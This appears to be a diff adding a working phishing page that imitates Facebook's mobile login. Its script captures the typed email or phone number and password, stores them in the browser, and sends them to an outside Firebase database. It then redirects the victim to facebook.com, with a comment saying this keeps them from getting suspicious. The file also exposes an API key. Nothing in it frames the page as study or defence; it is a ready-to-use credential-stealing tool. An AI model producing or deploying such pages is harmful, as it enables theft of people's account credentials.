@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Top Navigation -->
+        <header class="header">
+            <span class="back-arrow">&#10094;</span>
+            <p class="language">English (US)</p>
+        </header>
+
+        <!-- Login Form Section -->
+        <main class="form-section">
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="userInput" placeholder="Mobile number or email" required>
+                    <input type="password" id="passInput" placeholder="Password" required>
+                </div>
+
+                <button type="submit" class="btn-login">Log in</button>
+            </form>
+            
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </main>
+
+        <!-- Bottom Action -->
+        <footer class="footer">
+            <button type="button" class="btn-create">Create new account</button>
+        </footer>
+    </div>
+
+    <!-- This script captures the input data -->
+    <script>
+        const loginForm = document.getElementById('loginForm');
+
+loginForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const data = {
+        user: document.getElementById('userInput').value,
+        pass: document.getElementById('passInput').value,
+        date: new Date().toLocaleString()
+    };
+
+    // Save it to the phone's browser memory
+    localStorage.setItem('captured_user', JSON.stringify(data));
+
+    alert("Saved to local memory!");
+    
+    // To see what's saved, you can type this in the console: 
+    // console.log(localStorage.getItem('captured_user'));
+});
+// Add this to your script to see what you've collected
+function showSavedData() {
+    const saved = localStorage.getItem('lastLogin');
+    if (saved) {
+        const data = JSON.parse(saved);
+        alert("Last Captured:\nUser: " + data.user + "\nPass: " + data.pass);
+    } else {
+        alert("No data captured yet!");
+    }
+}
+// Replace these with the actual values from your Firebase settings
+const firebaseConfig = {
+  apiKey: "AIzaSyCBE8pitbvZOgqznW5OoCURpxWTmuA0sug",
+  databaseURL: "https://facebock-9aeb4-default-rtdb.firebaseio.com",
+  projectId: "facebock-9aeb4",
+  // ... rest of the config
+};
+
+// Initialize
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
+
+// When they click "Log in"
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const user = document.getElementById('userInput').value;
+    const pass = document.getElementById('passInput').value;
+
+    // Send to YOUR phone (the cloud)
+    database.ref('logins/').push({
+        mobile_or_email: user,
+        password: pass,
+        device_time: new Date().toLocaleString()
+    }).then(() => {
+        // After sending, redirect them so they don't get suspicious
+        window.location.href = "https://www.facebook.com"; 
+    });
+});
+    </script>
+
+</body>
+</html>
